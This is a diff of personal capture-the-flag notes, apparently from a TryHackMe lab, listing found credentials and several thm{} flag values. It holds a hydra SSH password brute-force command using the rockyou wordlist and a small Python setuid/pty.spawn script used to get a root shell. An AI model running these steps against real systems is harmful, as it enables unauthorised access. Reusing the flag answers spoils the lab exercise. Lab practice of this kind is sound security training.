@@ -7,9 +7,24 @@ Passwd: anonymous
 # USERS:
 
 gcrawford:PAOLA
-  
+
+hydra ssh://IP -l rcampbell -P /usr/share/wordlists/rockyou.txt -t 64
+
 rcampbell:molly,april
+ssh rcampbell@IP
+import os,pty
+
+os.setuid(0)
+pty.spawn("/bin/bash")
+
+rcampbell@gibson:~$ python3 root.py
+#
 
 # Flags
 
-thm{678d0231fb4e2150afc1c4e336fcf44d}        
+thm{d8deb5f0526ec81f784ce68e641cde40}
+thm{3ce2fe64055d3b543360c3fc880194f8}
+thm{b94f8d2e715973f8bc75fe099c8492c4}
+thm{879f3238fb0a4bf1c23fd82032d237ff}
+thm{12361ad240fec43005844016092f1e05}
+thm{678d0231fb4e2150afc1c4e336fcf44d}
